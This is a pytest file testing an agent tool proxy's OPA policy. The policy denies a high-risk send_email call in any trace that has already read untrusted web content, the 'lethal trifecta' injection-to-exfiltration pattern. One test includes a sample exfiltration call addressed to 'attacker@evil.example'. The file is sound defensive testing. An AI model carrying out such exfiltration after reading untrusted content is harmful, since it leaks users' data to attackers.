"""
Slice 13 tests: provenance-aware authorization.

Ties an authorization decision to WHERE the calling context came from —
the "lethal trifecta" pattern (untrusted-content exposure + the ability
to exfiltrate or touch a credential in the same causal trace). Runs
against the REAL OPA instance and the real authz.rego policy (same
approach as test_opa_policy.py), not a mocked check_permission — the
whole point is proving OPA itself denies the tainted high-risk call,
not just that mcp_proxy_service calls check_permission with the right
arguments.

_call_mcp_server IS mocked in every test here — no real MCP server is
needed to prove policy behavior, and mocking it keeps these tests from
depending on the mock-mcp-server container's own tool implementations.
"""

import uuid

import pytest
from unittest.mock import patch
from fastapi import HTTPException
from sqlalchemy import select, update
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.agent import Agent
from app.models.mcp_session import McpSession
from app.models.organization import Organization
from app.services.mcp_proxy_service import mcp_proxy_service

# One binding whose results this platform doesn't control (web search),
# one binding whose one tool is tagged as a high-risk capability
# (sending mail out is the textbook "external_send" — the exfiltration
# step of the lethal trifecta). Both operator-authored, exactly like
# tool_filter — an agent can't self-declare either flag.
PROVENANCE_BINDINGS = [
    {
        "server_id": "web-mcp",
        "server_url": "http://mock-mcp:8080",
        "tool_filter": ["search_web"],
        "untrusted_source": True,
    },
    {
        "server_id": "comms-mcp",
        "server_url": "http://mock-mcp:8080",
        "tool_filter": ["send_email"],
        "tool_capabilities": {"send_email": ["external_send"]},
    },
]


async def _set_bindings(db_session: AsyncSession, agent: Agent, bindings: list[dict]) -> None:
    await db_session.execute(
        update(Agent).where(Agent.id == agent.id).values(mcp_bindings=bindings)
    )
    await db_session.commit()


@pytest.mark.asyncio
async def test_external_send_denied_after_untrusted_read_in_same_trace(
    db_session: AsyncSession, test_org: Organization, test_agent: Agent,
):
    await _set_bindings(db_session, test_agent, PROVENANCE_BINDINGS)
    trace_id = f"provenance-tainted-{uuid.uuid4()}"

    with patch.object(mcp_proxy_service, "_call_mcp_server", return_value=({"result": "ok"}, None)):
        # An untrusted read succeeds — nothing risky about the read itself.
        read_result = await mcp_proxy_service.execute_tool(
            db_session,
            agent_id=test_agent.id,
            org_id=test_org.id,
            mcp_server_id="web-mcp",
            tool_name="search_web",
            tool_args={"q": "test"},
            token_scopes=["tool:execute"],
            causal_trace_id=trace_id,
        )
        assert read_result["session_id"]

        # The SAME trace now attempts a high-risk capability — OPA must
        # deny it outright even though scope, tool_filter, and binding
        # resolution all otherwise permit this exact call.
        with pytest.raises(HTTPException) as exc_info:
            await mcp_proxy_service.execute_tool(
                db_session,
                agent_id=test_agent.id,
                org_id=test_org.id,
                mcp_server_id="comms-mcp",
                tool_name="send_email",
                tool_args={"to": "attacker@evil.example", "body": "exfiltrated"},
                token_scopes=["tool:execute"],
                causal_trace_id=trace_id,
            )
    assert exc_info.value.status_code == 403
    assert exc_info.value.detail["error"] == "tool_call_blocked"


@pytest.mark.asyncio
async def test_external_send_allowed_in_a_parallel_trace_with_no_untrusted_read(
    db_session: AsyncSession, test_org: Organization, test_agent: Agent,
):
    """Same agent, same risky capability — a DIFFERENT trace that never touched untrusted content is unaffected."""
    await _set_bindings(db_session, test_agent, PROVENANCE_BINDINGS)
    trace_id = f"provenance-clean-{uuid.uuid4()}"

    with patch.object(mcp_proxy_service, "_call_mcp_server", return_value=({"result": "sent"}, None)):
        result = await mcp_proxy_service.execute_tool(
            db_session,
            agent_id=test_agent.id,
            org_id=test_org.id,
            mcp_server_id="comms-mcp",
            tool_name="send_email",
            tool_args={"to": "customer@example.com", "body": "hello"},
            token_scopes=["tool:execute"],
            causal_trace_id=trace_id,
        )
    assert result["session_id"]


@pytest.mark.asyncio
async def test_taint_does_not_block_a_non_high_risk_capability(
    db_session: AsyncSession, test_org: Organization, test_agent: Agent,
):
    """A tainted trace only denies the SPECIFIC capabilities the policy names — an untagged call after an untrusted read is unaffected."""
    await _set_bindings(db_session, test_agent, PROVENANCE_BINDINGS)
    trace_id = f"provenance-tainted-harmless-{uuid.uuid4()}"

    with patch.object(mcp_proxy_service, "_call_mcp_server", return_value=({"result": "ok"}, None)):
        await mcp_proxy_service.execute_tool(
            db_session,
            agent_id=test_agent.id,
            org_id=test_org.id,
            mcp_server_id="web-mcp",
            tool_name="search_web",
            tool_args={"q": "first"},
            token_scopes=["tool:execute"],
            causal_trace_id=trace_id,
        )
        second_read = await mcp_proxy_service.execute_tool(
            db_session,
            agent_id=test_agent.id,
            org_id=test_org.id,
            mcp_server_id="web-mcp",
            tool_name="search_web",
            tool_args={"q": "second"},
            token_scopes=["tool:execute"],
            causal_trace_id=trace_id,
        )
    assert second_read["session_id"]


@pytest.mark.asyncio
async def test_source_untrusted_only_recorded_on_actual_success(
    db_session: AsyncSession, test_org: Organization, test_agent: Agent,
):
    """A call to an untrusted_source binding that errors never actually retrieved content — it must not taint the trace."""
    await _set_bindings(db_session, test_agent, PROVENANCE_BINDINGS)
    trace_id = f"provenance-error-{uuid.uuid4()}"

    with patch.object(mcp_proxy_service, "_call_mcp_server", return_value=(None, "mcp_timeout")):
        with pytest.raises(HTTPException):
            await mcp_proxy_service.execute_tool(
                db_session,
                agent_id=test_agent.id,
                org_id=test_org.id,
                mcp_server_id="web-mcp",
                tool_name="search_web",
                tool_args={"q": "test"},
                token_scopes=["tool:execute"],
                causal_trace_id=trace_id,
            )

    row = (
        await db_session.execute(
            select(McpSession).where(McpSession.causal_trace_id == trace_id)
        )
    ).scalar_one()
    assert row.status == "error"
    assert row.source_untrusted is False

    # And because nothing tainted this trace, a high-risk call in the
    # SAME trace right after the failed read still succeeds.
    with patch.object(mcp_proxy_service, "_call_mcp_server", return_value=({"result": "sent"}, None)):
        result = await mcp_proxy_service.execute_tool(
            db_session,
            agent_id=test_agent.id,
            org_id=test_org.id,
            mcp_server_id="comms-mcp",
            tool_name="send_email",
            tool_args={"to": "customer@example.com", "body": "hello"},
            token_scopes=["tool:execute"],
            causal_trace_id=trace_id,
        )
    assert result["session_id"]
